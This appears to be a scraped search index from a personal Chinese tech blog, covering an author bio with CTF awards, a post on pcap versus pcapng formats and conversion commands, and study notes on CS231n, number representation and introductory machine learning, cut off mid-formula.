🥉第六届“湖湘杯”网络安全技能大赛洞庭决赛十二名 Hunan,China,Nov,2020   🥉红明谷杯数据安全大赛决赛第十四名(并列第十) Sanming,China,Apr,2021   🥈第三届信息安全铁人三项赛总决赛二等奖 Sanming,China,Apr,2021   🏆第十四届全国大学生信息安全竞赛——创新实践能力赛华东南赛区一等奖 Fuzhou,China,June,2021   🥉第十四届全国大学生信息安全竞赛——创新实践能力赛总决赛三等奖 Harbin,China,June,2021   🏆第五届\u0026quot;蓝帽杯\u0026quot;全国大学生网络安全机能大赛总决赛一等奖 Online,Aug,2021   🏆第七届XCTF国际联赛分站赛L3HCTF冠军 Online,Nov,2021    完成阅读或在读 开发  《C语言程序设计》2019下 《C++面向对象程序设计》2020上 《Qt图形界面编程入门》2020上 《大话数据结构》2020暑假 《HTML5从入门到精通》2019寒假 《JavaScript从入门到精通》2019寒假 《Vue.js从入门到项目实战》2019寒假 《PHP+MySQL网站开发入门与提高》2019寒假 《python从入门到精通》2019寒假 《python3网络爬虫开发实战》2020暑假 《流畅的python》佛系在读 《Flask Web开发 基于Python的Web应用开发实战》 2020下 《Flask Web开发实战 入门、进阶与原理解析》2020下 《CORE JAVA Volume I——Fundamentals》2020寒假 《Python for Data Analysis》2020寒假  计算机  《汇编语言 王爽》2021上  计算机网络  《wireshark数据包分析实战》2020暑假 《TCP/IP详解 卷一：协议》在读  web安全  《web安全防护指南》2019下 《web安全攻防：渗透测试实战指南》2019下  AI  《Python深度学习》2020寒假 《Coursera-ML-AndrewNg》2020寒假  Linux\u0026amp;云计算\u0026amp;虚拟化  《Linux就该这么学》2019下 《Docker技术入门与实践》2020下  Misc  《The Art of Memory Forensics》英文不好 佛系在读 《内存取证原理与实践》在读 《Modbus软件开发实战指南》2020下  密码学  《Python密码学编程》2020下 《深入浅出密码学》佛系在读  其他  《CTF特训营》佛系在读  Contact Email:ruokeqx@163.com\n","description":"about","id":8,"section":"","tags":null,"title":"About","uri":"https://ruokeqx.gitee.io/about/"},{"content":"前言 这次L3HCTF跟着队友混了个冠军。\n在看官方a-sol的wp的时候看到一个脚本中有如下代码，直接运行会报错。ValueError: invalid tcpdump header\n1  dpkt.pcap.Reader(open(\u0026#34;a-sol.pcap\u0026#34;,\u0026#39;rb\u0026#39;))   事实上dpkt有pcang的解析模块，将代码修改如下即可正确运行。\n1  dpkt.pcapng.Reader(open(\u0026#34;a-sol.pcapng\u0026#34;,\u0026#39;rb\u0026#39;))   这个问题之前在写恶意流量识别项目的时候也遇到过，当时对pcap和pcapng差别不很清楚，只是知道格式不一样，并没有深入的进行研究，而是选择使用WinDump替代tshark进行流量捕获。这次又遇到了，就来仔细看一下，本来是准备写就看一下格式转换方法，发现越看越多，那就看到哪写到哪吧。\n一点研究 现象及验证 有两个以前遇到的流量包，一个可以用dpkt.pcap包解析，一个不能用dpkt.pcap\n1 2 3 4  ⚡ /mnt/c/project/pcap \u0026gt; hexdump 03.pcap | head -n 1 0000000 c3d4 a1b2 0002 0004 0000 0000 0000 0000 ⚡ /mnt/c/project/pcap \u0026gt; hexdump a-sol.pcapng | head -n 1 0000000 0d0a 0a0d 00c8 0000 3c4d 1a2b 0001 0000   虚拟机使用tcpdump捕获是pcap格式\n1 2 3 4 5 6 7  ~ \u0026gt; sudo tcpdump -i ens32 -s 10 -w vmcap.pcap tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 10 bytes ^C2698 packets captured 2728 packets received by filter 0 packets dropped by kernel ~ \u0026gt; hexdump vmcap.pcap | head -n 1 0000000 c3d4 a1b2 0002 0004 0000 0000 0000 0000   win10wireshark捕获默认为pcapng格式，可以选择保存为pcap格式\n1 2 3 4  ⚡ \u0026gt; /mnt/c/project/pcap \u0026gt; hexdump out.pcap | head -n 1 0000000 c3d4 a1b2 0002 0004 0000 0000 0000 0000 ⚡ \u0026gt; /mnt/c/project/pcap \u0026gt; hexdump out.pcapng | head -n 1 0000000 0d0a 0a0d 00c0 0000 3c4d 1a2b 0001 0000   WinDump捕获的是pcap格式\n1 2 3 4 5 6 7 8 9  PS C:\\Users\\ruokeqx\\Downloads\u0026gt; WinDump.exe -s 10000 -w out.pcap C:\\Windows\\system32\\WinDump.exe: listening on {1BEDAF4F-8ABD-46F4-B122-453989CD2B2F} 222 packets captured 222 packets received by filter 0 packets dropped by kernel PS C:\\Users\\ruokeqx\\Downloads\u0026gt; wsl ⚡ \u0026gt; /mnt/c/Users/ruokeqx/Downloads \u0026gt; hexdump out.pcap | head -n 1 0000000 c3d4 a1b2 0002 0004 0000 0000 0000 0000   引入 对于两种格式的研究更像是对历史的研究（\n在Winpcap官方的项目NTAR首页的介绍可以看到下面一段话。\nNTAR implements a new \u0026quot;wanna-be\u0026quot; dump standard that overcomes the limits of the current libpcap/WinPcap dump format, by allowing the user to save packets coming from multiple interfaces and different data-links in a single trace file. 这里可以获得很多信息，新的标准(即pcapng)通过允许用户保存packets coming from multiple interfaces and different data-links到一个流量包里来克服现存libpcap/WinPcap捕获格式的缺陷。\n下面链接中对PCAP Next Generation Dump File Format进行了详细阐述。\nhttps://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html\n至于最显示的特征差别就在于文件头了，可以通过文件头快速确定格式。\nThe block type of the Section Header Block is the integer corresponding to the 4-char string \u0026quot;\\r\\n\\n\\r\u0026quot; (0x0A0D0D0A). 选用这个文件头的原因文中有描述，简单说一是检测inappropriate ASCII conversion判断文件是否损坏，二是回文任意字节序都能识别出来。\n而pcap的文件头是0xA1B2C3D4，至此文件格式和对于的捕获文件头都符合了。\nThe PCAP format has become the standard format for dumping captured packets in the free and open-source software community. Hone strives to adhere to this format as much as possible to help achieve acceptance within the networking community and to allow interoperability with other software. The original PCAP format, however, is deficient in describing anything except packets. Luckily, there is a new PCAP format, PCAP-NG (PCAP Next Generation), on the horizon with initial support in libpcap, wireshark, and other analysis software. pcapng 就是 PCAP next generation 的意思，他的文件格式规范在下面链接中。\nhttps://github.com/pcapng/pcapng\nhttps://github.com/HoneProject/Linux-Sensor/wiki/Augmented-PCAP-Next-Generation-Dump-File-Format\npcap格式草案\nhttps://datatracker.ietf.org/doc/html/draft-gharris-opsawg-pcap-02\npcapng格式草案\nhttps://datatracker.ietf.org/doc/html/draft-tuexen-opsawg-pcapng\nNTAR可以读写pcapng文件但是项目已经frozen并且不支持一些块。\nThe Network Trace Archival and Retrieval library is able to read and write pcapng files. Caveats: i) frozen since 2007, ii) no plugins for EPB, ISB, and NRB blocks wireshark的wiki中有一个NTAR的扩展程序ntartest（个人感觉没啥用）\nhttps://gitlab.com/wireshark/wireshark/-/wikis/Development/PcapNg#ntartest-a-simplistic-standalone-pcapng-ntar-file-reader\n更多 Tcpdump\\libpcap\nTcpdump通过libpcap抓取报文，在linux平台，libpcap通过AF_PACKET套接字抓取。Tcpdump官方推荐windows用户使用winpcap和windump(现在看来当时似乎没选错)。保存格式为pcap\nTcpdump uses libpcap, a system-independent interface for user-level packet capture. People with Windows distributions are best to check the Windows PCAP page for references to WinDUMP. WinDump\\WinPcap\nWinDump是windows平台的tcpdump，他基于WinPcap的。保存格式也是pcap\nWinDump is the Windows version of tcpdump, the command line network analyzer for UNIX. WinDump is fully compatible with tcpdump and can be used to watch, diagnose and save to disk network traffic according to various complex rules. It can run under Windows 95, 98, ME, NT, 2000, XP, 2003 and Vista. WinDump captures using the WinPcap library and drivers, which are freely downloadable from the WinPcap.org website. WinDump supports 802.11b/g wireless capture and troubleshooting through the Riverbed AirPcap adapter. 而WinDump官方的changelog显示他们在06年以后就没有更新了。\n而WinPcap也在13年发布最后一次更新或后再也没有更新，他们在18年发布了如下通知，就是说不会再有更新，社区支持还会存在，替代物建议使用nmap作者创建的npcap。\nWinPcap, though still available for download (v4.1.3), has not seen an upgrade in many years and there are no road map/future plans to update the technology. While community support may persist, technical oversight by Riverbed staff, responses to questions posed by Riverbed resources, and bug reporting are no longer available. Gordon Lyon, Nmap project founder, has created Npcap, a packet capture library for Windows, that includes WinPcap compatibility and may be a suitable replacement for WinPcap and WinPcap Pro. Information can be found at https://nmap.org/npcap/. Wireshark\\Npcap\nWireshark is the world’s foremost and widely-used network protocol analyzer. The Wireshark installer includes Npcap which is required for packet capture. windows安装wireshark的时候会让安装npcap，也就是说wireshark作为最先进的抓包和分析工具之一已经选用了npcap。\nwireshark安装附带多个程序\n1 2 3 4 5 6 7  Tools - Additional command line tools to work with capture files Editcap - Reads a capture file and writes some or all of the packets into another capture file. Text2Pcap - Reads in an ASCII hex dump and writes the data into a pcap capture file. Reordercap - Reorders a capture file by timestamp. Mergecap - Combines multiple saved capture files into a single output file. Capinfos - Provides information on capture files. Rawshark - Raw packet filter.   下面是参数中有对格式进行说明的，他们都可以指定文件格式，而且全部都是默认使用pcapng格式。\n1 2 3 4 5 6 7 8 9 10 11 12  dumpcap.exe --help -n use pcapng format instead of pcap (default) -P use libpcap format instead of pcapng tshark.exe --help -F \u0026lt;output file type\u0026gt; set the output file type, default is pcapng an empty \u0026#34;-F\u0026#34; option will list the file types editcap.exe --help -F \u0026lt;capture type\u0026gt; set the output file type; default is pcapng. An empty \u0026#34;-F\u0026#34; option will list the file types. mergecap.exe --help -F \u0026lt;capture type\u0026gt; set the output file type; default is pcapng. An empty \u0026#34;-F\u0026#34; option will list the file types.   其中只指定-F输出的提示性可用格式如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  mergecap: The available capture file types for the \u0026#34;-F\u0026#34; flag are: 5views - InfoVista 5View capture btsnoop - Symbian OS btsnoop commview - TamoSoft CommView dct2000 - Catapult DCT2000 trace (.out format) erf - Endace ERF capture eyesdn - EyeSDN USB S0/E1 ISDN trace format k12text - K12 text file lanalyzer - Novell LANalyzer logcat - Android Logcat Binary format logcat-brief - Android Logcat Brief text format logcat-long - Android Logcat Long text format logcat-process - Android Logcat Process text format logcat-tag - Android Logcat Tag text format logcat-thread - Android Logcat Thread text format logcat-threadtime - Android Logcat Threadtime text format logcat-time - Android Logcat Time text format modpcap - Modified tcpdump - pcap netmon1 - Microsoft NetMon 1.x netmon2 - Microsoft NetMon 2.x nettl - HP-UX nettl trace ngsniffer - Sniffer (DOS) ngwsniffer_1_1 - NetXray, Sniffer (Windows) 1.1 ngwsniffer_2_0 - Sniffer (Windows) 2.00x niobserver - Network Instruments Observer nokiapcap - Nokia tcpdump - pcap nsecpcap - Wireshark/tcpdump/... - nanosecond pcap nstrace10 - NetScaler Trace (Version 1.0) nstrace20 - NetScaler Trace (Version 2.0) nstrace30 - NetScaler Trace (Version 3.0) nstrace35 - NetScaler Trace (Version 3.5) pcap - Wireshark/tcpdump/... - pcap pcapng - Wireshark/... - pcapng rf5 - Tektronix K12xx 32-bit .rf5 format rh6_1pcap - RedHat 6.1 tcpdump - pcap snoop - Sun snoop suse6_3pcap - SuSE 6.3 tcpdump - pcap visual - Visual Networks traffic capture   Npcap是nmap在win平台的流量捕捉库，linux和mac也支持了npcap，其是winpcap的改善和扩展。\nNpcap is the Nmap Project's packet capture (and sending) library for Microsoft Windows. It implements the open Pcap API using a custom Windows kernel driver alongside our Windows build of the excellent libpcap library. Mac and Linux systems already include the Pcap API, so Npcap allows popular software such as Nmap and Wireshark to run on all these platforms (and more) with a single codebase. Npcap began in 2013 as some improvements to the (now discontinued) WinPcap library, but has been largely rewritten since then with hundreds of releases improving Npcap's speed, portability, security, and efficiency. 转换方法 pcapng to pcap 方法一：直接用wireshark打开pcapng文件另存为pcap文件\n方法二：editcap指定格式输出\n1  editcap.exe a-sol.pcapng a-sol.pcap -F pcap   方法三：用mergecap将pcapng转化为指定的pcap格式\n1  mergecap.exe a-sol.pcapng -w a-sol.pcap -F pcap   此外mergecap功能如其名，还能将多个包合到一起。\n方法四：tcpdump/libpcap (4.1.0+/1.1.0+)\n1  tcpdump -r a-sol.pcapng -w a-sol.pcap   pcap to pcapng 1 2  editcap -F pcapng file.pcap file.pcapng tshark -F pcapng -r file.pcap -w file.pcapng   ","description":"","id":9,"section":"posts","tags":["network"],"title":"pcap和pcapng格式的一点研究","uri":"https://ruokeqx.gitee.io/posts/cap%E6%A0%BC%E5%BC%8F/"},{"content":"Where is article comes from?\nAn idea of a pornography detection project for ciscn 2021. And when searching on Google, I came accross a report from cs231n named Combining CNNs for detecting pornography in the absence of labeled training data.\n历史介绍 人们提出一个问题：我们是否具备了识别真实世界中的每一个物体的能力。这个问题也是由机器学习中大部分的机器学习算法当我们的训练数据量不够时，很可能很快就会会过拟合的现象驱动。我们开展了一个叫ImageNet的项目，包含世界万物 组成一个尽可能大的数据集。下载了很多很多图片，organized by the dictionary called WordNet.\nThe winning algorithm of the 2012\u0026rsquo;s ImageNet Large-Scale VIsual Recognition Challenge is a convolutional neural network model.\nAnd in 2015 it got really crazy and paper from MS called Residual Networks(残差网络) were 152 layers.\nImage Classification pipeline Nearest Neighbor（最近邻）: Predict the label of the most similar training image\n如何判断最近？\nL1 distance【也叫曼哈顿距离，街区距离】: $d_1(I_1,I_2) = \\sum_p |I_1 ^P - I_2 ^P|$ 每个像素差绝对值然后求和\n最近邻复杂度：Train O(1) predict O(n)\n这是不好的，我们希望预测的快一点，训练的时候慢一点没关系\nK-Nearest Neighbors(K最近邻)： 最近邻得到的是突兀的边界，因为他取的是单个点和单个点之间的垂直平分线。\nInstead of copying label from nearest neighbor, take majority vote from K closest points.\n这样可以找到一个泛化能力更好的平滑边界\nL2 distance 【两点距离公式】：$d_2(I_1,I_2) = \\sqrt {\\sum_p(I_1 ^P-I_2 ^P) ^2}$ 这是一个圆。而L1距离是正方形。\nL1距离对坐标轴的旋转比较敏感（比较适合坐标轴定义明确的东西）\nvision.stanford.edu/teaching/cs231n-demos/knn/\n超参数：是由我们设置的而不是机器学习的\n超参数的选择：1. 全是数据集 2.训练集 测试集 3.训练集 验证集 测试集（better）4.交叉验证（小数据集有用，深度学习用的不多）\nKNN从来不在图像上使用，因为速度很慢，而且图片进行一些操作指标还是一模一样（distance metrics on pixels are not informative）维数灾难 指数增加(curse of dimensionality)\n线性分类器在神经网络中很常用\nvisual viewpoint\nhttps://playground.tensorflow.org/\nhttp://vision.stanford.edu/teaching/cs231n-demos/linear-classify/\n线性分类、损失函数和梯度下降 the SVM loss has the form:\n$L_i = \\sum_{j\\neq y_i}max(0,s_j-s_{y_i}+1)$\n正则化：通过$\\lambda$ 控制参数更小，以减少过拟合 Simple examples：\nL2 regularization: $R(W) = \\sum_k\\sum_lW_{k,l} ^2$\nL1 regularization: $R(W) = \\sum_k\\sum_l|W_{k,l}|$\nElastic net(L1+L2): $R(W) = \\sum_k\\sum_l \\beta W_{k,l} ^2+|W_{k,l}|$\nMore complex:\nDropout\nBatch normalization\nStochastic depth, fractional pooling, etc\nSoftmax Classifier(多分类逻辑回归) Softmax function: $P(Y=k|X=x_i) = \\frac {e ^sk}{\\sum_je ^sj}$\n先exp然后归一化, 分数改变为概率\n之后接入交叉熵损失函数\nmaximum likelihood estimation:\nchoose weights to maximize the likelihood of the observed data\n梯度下降 数值解和解析解 解析解更快但容易错\n提取图片特征输入而非直接像素点输入，如HOG(Histogram of Oriented Gradients), 坐标变化（直角坐标转化为极坐标 可以解决同心圆问题）\n","description":"","id":10,"section":"posts","tags":["AI","course"],"title":"CS231 Convolutional Neural Networks for Visual Recognition——Stanford","uri":"https://ruokeqx.gitee.io/posts/cs231/"},{"content":"数据表示和存储 定点数和浮点数  计算机中只能通过约定小数点的位置来表示  定点数——小数点位置约定在固定位置的数 浮点数——小数点位置约定为可浮动的数   定点小数用来表示浮点数的尾数部分 定点整数用来表示整数 分为带符号整数和无符号整数 任何实数：$X=(-1)^S \\times M \\times R^E$ S表示正负；M为二进制定点小数，称为X的尾数；E是二进制定点整数，称为X的阶或指数；R是基数，可以为2、4、16等。只要表示S、M和E三个信息就能确定X的值，这称为浮点数。  定点数的编码表示  定点数的编码   原码、补码、移码、反码（很少用）    原码：正号0 负号1 其余二进制表示\n  缺点：\n 0的表示不唯一，不利于编程 加减运算方式不同意 需要额外对符号位进行处理，不利于硬件设计 当a\u0026lt;b 实现a-b比较困难  从50年代开始，整数都采用补码表示，但浮点数的尾数用原码定点小数表示\n    移码：将每一个数值加上一个偏置常数（Excess / Bias）\n  通常当编码位数为n时，bias取$2^{n-1} 或2^{n-1}-1(如IEEE 754)$\n Ex. n=4: $E_{biased} = E+2^3 (bias=2^3=1000B)$  -8(+8) ~ 0000B -7(+8) ~ 0001B \u0026hellip;.. 0(+8) ~ 1000B \u0026hellip;.. +7(+8) ~ 1111B      用移码来表示指数(阶码)便于浮点数加减运算时的对阶操作(比较大小)\n Ex: $1.01\\times 2 ^{-1}+1.11\\times2 ^3$ $1.01\\times2 ^{-1+4}+1.11\\times2 ^{3+4}$  补码：111(-1)\u0026lt;011(3)?\t移码：011(3)\u0026lt;111(7)        补码：模运算 在一个模运算系统中，一个数与它除以“模”后的余数等价。\n  $10-4=6$\n$10+8=18\\equiv6 (mod 12)$\n$10-4\\equiv10+8 (mod 12)$\n$-4\\equiv8 (mod 12)$\n$结论1：一个负数的补码等于模减该负数的绝对值$\n$结论2：对于某一确定的模，某数减去小于模的另一数，总可以用该数加上另一数负数的补码来代替（在模运算中减法和加法可以转换）$\n$Ex. 9828-1928=9828+(10^4-1928)$\n$=9828+8072$\n$=17900$\n$=7900(mod 10^4)$\n$[X]_补=2 ^n+X (-2 ^n\u0026lt;=X\u0026lt;2 ^n,mod 2 ^n)$ X是真值 $[X]_补$是机器数\n$[-2 ^{n-1}]_补=2 ^n-2 ^{n-1}=10\u0026hellip;0(n-1个0)$\n$[-1]_补=2 ^n-0\u0026hellip;01=11\u0026hellip;1(n个1)$\n$[+0]_补=[-0]_补=00\u0026hellip;0(n个0)$\n$[-01111011]_补=2 ^8-01111011=100000000-01111011=11111111-01111011+1=10000100+1=10000101=85H$\n负数求补码 简便方法：从右向左遇到的第一个1的前面各位取反\n变形补码：表示溢出(两位不同则为溢出) 8-\u0026gt;1000(补码)-\u0026gt;01000(变形补码)\n求补码的真值：符号位0 数值部分相同；符号位1 负数，数值位取反 末尾加1\nC语言中的整数 无符号整数(Unsigned integer)\n  LSB(least significant bit)最低有效位 MSB最高有效位\n  一般在结果没有负值的场合用无符号数：地址运算，编号表示等等\n  带符号整数(Signed integer)\n  有三种编码表示\n 原码：定点小数，用来表示浮点数的尾部 移码：定点整数，用于表示浮点数的阶（指数） 补码：50年代以来 所有计算机都用补码来表示带负号整数    为什么用补码表示带符号整数？\n 补码运算系统是模运算系统，加减统一 数0的表示唯一，方便使用 比原码多表示一个最小负数    若同时有无符号和带符号整数，则C编译器将带符号整数强制转换为无符号数\n   范围 C90类型     0~$2 ^{31}-1$ int   $2 ^{31}$~$2 ^{32}-1$ unsigned int   $2 ^{32}$~$2 ^{63}-1$ long long   $2 ^{63}$~$2 ^{64}-1$ unsigned long long       范围 C99类型     0~$2 ^{31}-1$ int   $2 ^{31}$~$2 ^{63}-1$ long long   $2 ^{63}$~$2 ^{64}-1$ unsigned long long    浮点数的编码表示    0 1-8 9-31     S 阶码E 尾数M    第0位树符S；第1~8位位8位移码表示解码E（偏置常数为128）；第9~31位位24位二进制原码小数表示的尾数M。规格化尾数的小数点后第一位总是1，所以第一位默认1不明显表示出来。这样可用23个数位表示24位尾数。\n最大正数：0.11\u0026hellip;1 x $2 ^{11\u0026hellip;1}$=(1-$2 ^{-24}$) x $2 ^{127}$\n最小正数：0.10\u0026hellip;0 x $2 ^{00\u0026hellip;0}$=(1/2) x $2 ^{-128}$\n不同机器浮点数表示不同，所以出现了IEEE 754\nIEEE 754标准\nExponent(阶码)：\n SP规格化解码范围为0000 0001(-126) ~ 1111 1110(127) bias为127(single),1023(double)  Significand(尾数)：\n 规格化尾数最高位总是1，所以隐含表示，省1位 1+23 bits(single), 1+52 bits(double)  SP: $(-1) ^S \\times (1+Significand) \\times x ^{Exponent-127}$\nDP: $(-1) ^S \\times (1+Significand) \\times x ^{Exponent-1023}$\n例：float型变量x的机器数为BEE00000H，求x的值？\n1011 1110 1110 0000 0000 0000 0000 0000\n  数符：1（负数）\n  阶（指数）：\n 阶码：0111 1101 B = 125 阶码的值：125-127 = -2    尾数数值部分：\n$1+1\\times x ^{-1}+1 \\times 2 ^{-2}+0 \\times 2 ^{-3}+0 \\times 2 ^{-4}\u0026hellip;..$\n=$1+2 ^{-1}+2 ^{-2}=1+0.5+0.25=1.75$\n  真值=$1.75 \\times 2 ^{-2}=-0.4375$\n  例：float变量x值为-12.75，求x的机器数是多少？\n-12.75=-1100.11B=-1.10011B x $2 ^{3}$\n因此，符号S=1\n阶码E=127+3=128+2=1000 0010\n显式表示的部分尾数Significant=100 1100 0000 0000 0000 0000\nx机器数表示为：\n1100 0001 0100 1100 0000 0000 0000 0000\n转换为十六进制表示为：C14C0000H\n规格化数\n特殊数\n    0的机器数 无穷数 非数     阶码 全零 255（11111111B) 255   尾数 全零 全零 nonzero    非规格化数\n$(-1) ^S \\times 0.XXXXX \\times 2^ {-126}$\n非数值数据的编码表示 ASCII\n0-30H\n1-31H\nA-41H\na-61H\n汉字\n输入码：对汉字用相应案件进行编码表示，用于输入\n内码：用于再系统中进行存储、查找、传送等处理\n字模点阵或轮廓描述：描述汉字字模点阵或轮廓，用于显示、打印\nGB2312：94行94列，行号是区号，列位是位号，各为7位\n区、位码上各加32（20H\n得到两个字节编码 首位设为1，得到内码，避免与ASCII混淆\n数据宽度和存储量的单位 位bit 字节byte（ 现代计算机 存储器按字节编址 字节是最小可寻址单位）\n字(word) IA-32中 字 为16位 DWORD(双字 32位) QWORD（64位）\n数据存储时的字节排序 大端——数据高位在地址低位——photoshop，JPEG，MacPaint\n小端——数据低位在地址地位——GIF，PC Panintbrush，MS RTF\n个人总结  正数的原码 反码 补码 全都相等（因为反码补码都是为了解决减法引入的） 负数 原码符号位为1其余一样 反码是原码取反 补码=反码+1 计算机内部计算是用补码计算  四、 乘除运算及浮点数运算 整数乘法运算 当n=4时 5的平方=-7 n为位数\n在计算机内部，一个整数x的平方可能是负数，这是因为在计算机中其结果取的是x*x的低n位乘积而高n位中的有效数位被丢弃而造成的。\n当 (!x || z/x==y) 为真时【x=0或者z除回去还成立】 z正确；当 $-2^{n-1} \u0026lt;= x*y \u0026lt; 2^{n-1}$ 时（就是不溢出时 当前位数能存 当然不会变），即：乘积的高n位为全0或全1，并等于低n位的最高位，即：乘积的高n+1位为全0或全1\n如果是无符号数，只要判断乘积高n位是否全为0就能判断是否溢出\n无符号加减运算和带符号加减运算是一样的\n无符号乘法与带符号乘法低n位结果一样 高n位不一样（如果采取一样的指令 编译器就无法判断溢出了）（乘法指令不生产溢出标志，编译器可使用2n位成绩来判断是否溢出 PS：DX和AX的关系）\n溢出漏洞：申请的数据溢出了，但是计数还是很大，覆盖很大的空间。\n整数除法运算 ","description":"","id":11,"section":"posts","tags":["CS","course"],"title":"CSAPP\u0026NJU MOOC","uri":"https://ruokeqx.gitee.io/posts/csappnju-mooc/"},{"content":"Deep Learning\n","description":"","id":12,"section":"posts","tags":["AI","course"],"title":"CS230 Deep Learning——Andrew Ng——Stanford","uri":"https://ruokeqx.gitee.io/posts/deep-learning-andrew-ng-stanford/"},{"content":"1 Introduction what is machine learning supervised learning  supervised learning  regression problem  predict a continuous valued output   classification problem  predict a discrete valued output      SVM(Support Vector Machine) is a kind of generalized linear classification that classifies data by supervised learning\nunsupervised learning   unsupervised learning\n Cluster Algorithm  Google news Facebook friends      2. Linear Regression with One Variable 2.1 Model Representation Linear regression with one variable.\nUnivariate linear regression.\nm —— the number of training examples\nx —— input\ny —— output\nh —— hypothesis function\n$h_\\theta \\left( x \\right)=\\theta_{0}+\\theta_{1}x$\n2.2 Cost function also called square error function or square error cost function.\nhelp figure out how to fit the best possible straight line to our data.\nhow to choose parameter values to make hypothesis function fit better.($J \\left( \\theta_0, \\theta_1 \\right) = \\frac{1}{2m}\\sum\\limits_{i=1}^m \\left( h_{\\theta}(x ^{(i)})-y ^{(i)} \\right)^{2}$)\n2.3 Cost Function - Intuition 1 For each value of theta one corresponds to a different hypothesis or to a different straight line fit. And for each value of theta one, we could then derive a different value of J of theta one. And value of J of theta one plot the picture on the right.\nThe optimization objective for our learning algorithm is we want choose the value of theta one that minimizes J of theta one. This was our objective function for the linear regression.\n2.4 Cost Function - Intuition 2 1 parameter 2-D plot\n2 parameters 3-D plot\n2.5 Gradient Descent Imagine that this figure shows a hill, you are physically standing at a point one the hill. Gradient descent is to spin 360 degrees around and ask \u0026ldquo;if I were to take a little baby step in some direction, and I want go downhill as quickly as possible, what direction do I take?\u0026rdquo;\nGo until you converge to a local minimum. If you start at different point, gradient descent will take you to the second local optimum.\nThis is batch gradient descent algorithm and $\\alpha$ refer to the learning rate. We need update the $\\theta_0$ and $\\theta_1$ simultaneously.\n2.6 Gradient Descent Intuition For single variable function, partial derivative equal to derivative.\nThe direction of the derivative is opposite to the direction to be changed, so $\\alpha$ is preceded by a minus sign. Sign of partial derivative refer to the direction you need to go and $\\alpha$ refer to the length of your every little step. If $\\alpha$ is too small, gradient descent can be slow. If $\\alpha$ is too large, gradient descent can overshoot the minimum. It may fail to converge, or even diverge.\nThe reason why we don\u0026rsquo;t need to decrease $\\alpha$. (automatically take smaller steps)\n2.7 Gradient Descent For Linear Regression Apply gradient descent to minimum our squared error cost function.\nPartial derivative of cost function for linear regression:\n$\\frac{\\partial }{\\partial \\theta_j}J(\\theta_0,\\theta_1)=\\frac{\\partial }{\\partial \\theta_j}\\frac{1}{2m}\\sum\\limits_{i=1}^m \\left( h_{\\theta}(x ^{(i)})-y ^{(i)} \\right)^{2}$\n$j=0$ : $\\frac{\\partial }{\\partial \\theta_0}J(\\theta_0,\\theta_1)=\\frac{1}{m}\\sum\\limits_{i=1}^m \\left( h_{\\theta}(x ^{(i)})-y ^{(i)} \\right)$\n$j=1$ : $\\frac{\\partial }{\\partial \\theta_1}J(\\theta_0,\\theta_1)=\\frac{1}{m}\\sum\\limits_{i=1}^m \\left( \\left( h_{\\theta}(x ^{(i)})-y ^{(i)} \\right)\\cdot {x^{(i)}} \\right)$\nCost function for linear regression is always going to be a bowl-shaped function(convex function), it doesn\u0026rsquo;t have any local optima except for the one global optimum.\n\u0026ldquo;Batch\u0026rdquo;: each step of gradient descent uses all the training examples.\n3. Linear Algebra Review 3.1 Matrices and Vectors vector is a matrix that has only one column.\n3.2 Addition and Scalar Multiplication add or multiply every element\n3.3 Matrix Vector Multiplication $m×n$ matrix times $n×1$ vector equal to $m×1$​ vector\n3.4 Matrix Matrix Multiplication 3.5 Matrix Multiplication Properties all matrix:\n$A×B≠B×A$(commutative property of multiplication)\n$A×(B×C)=(A×B)×C$(associative property of multiplication)\nIdentity matrix:\nidentity matrix has ones along the diagonals and zero everywhere else.\n$$\\begin{bmatrix} 0 \u0026amp; -1 \\\\ 1 \u0026amp; 0 \\end{bmatrix}$$\n$AA ^{-1}=A ^{-1}A=I$\n$AI=IA=A$\n3.6 Inverse and Transpose inverse of matrix($A^{-1}$)\nonly square matrices have inverses.\n$AA ^{-1}=A ^{-1}A=I$\ntranspose:\nlet A be an m x n matrix, let $B = A^T$.\nThen B is an n x m matrix and $B_{ij} = A_{ji}$.\n$$\\begin{bmatrix} 1 \u0026amp; 2 \u0026amp; 0 \\\\ 3 \u0026amp; 5 \u0026amp; 9 \\end{bmatrix} = \\begin{bmatrix} 1 \u0026amp; 3 \\\\ 2 \u0026amp; 5 \\\\ 0 \u0026amp; 9 \\end{bmatrix}$$\n4. Linear Regression with Multiple Variables 4.1 Multiple Features $\\left( x_1,x_2,\u0026hellip;,x_n \\right)$ stand for multiple variables\n$x^{(i)}$ is a vector and it stand for the $i^{th}$ training example\n$x^{(2)}=\\begin{bmatrix} 1416 \\\\ 3 \\\\ 2 \\\\ 40 \\end{bmatrix}$\n$x_j^{(i)}$ stand for the value $j$ in $i^{th}$ training example.\n$x_2 ^{(2)}=3,x_3 ^{(2)}=2$\nthe form of the hypothesis:\n$h_\\theta \\left( x \\right)=\\theta_0+\\theta_1x_1+\\theta_2x_2+\u0026hellip;+\\theta_nx_n$\nFor convenience of notation, we define $x_0$ to be equals one.\nNow, $X$ is a $n+1$ dimensional feature vector; parameters $\\theta$ is also a $n+1$ dimensional vector.\n$X = \\begin{bmatrix} x_0 \\\\ x_1 \\\\ x_2 \\\\ \u0026hellip; \\\\ x_n \\end{bmatrix} \\theta = \\begin{bmatrix} \\theta_0 \\\\ \\theta_1 \\\\ \\theta_2 \\\\ \u0026hellip; \\\\ \\theta_n \\end{bmatrix} \\theta^T = \\begin{bmatrix} \\theta_0 \\ \\theta_1 \\ \\theta_2 \\ \u0026hellip; \\ \\theta_n \\end{bmatrix}$\n$h_\\theta \\left( x \\right)=\\theta_0 x_0 + \\theta_1 x_1 + \\theta_2 x_2+ \u0026hellip; + \\theta_n x_n$\n$h_\\theta \\left( x \\right)=\\theta^TX$\n4.2 Gradient Descent for Multiple Variables Gradient descent algorithm:\n$J({\\theta_0},{\\theta_1}\u0026hellip;{\\theta_n})=\\frac{1}{2m}\\sum\\limits_{i=1}^m{( h_\\theta(x^{(i)})-y^{(i)})^2}$\nwhen $n\u0026gt;=1$:\n${\\theta_0}:=\\theta_0-a\\frac{1}{m}\\sum\\limits_{i=1} ^m{(h_\\theta(x ^{(i)})-{y} ^{(i)})}x_0 ^{(i)}$\n${\\theta_1}:=\\theta_1-a\\frac{1}{m}\\sum\\limits_{i=1} ^m{(h_\\theta(x ^{(i)})-{y} ^{(i)})}x_1 ^{(i)}$\n${\\theta_2}:=\\theta_2-a\\frac{1}{m}\\sum\\limits_{i=1} 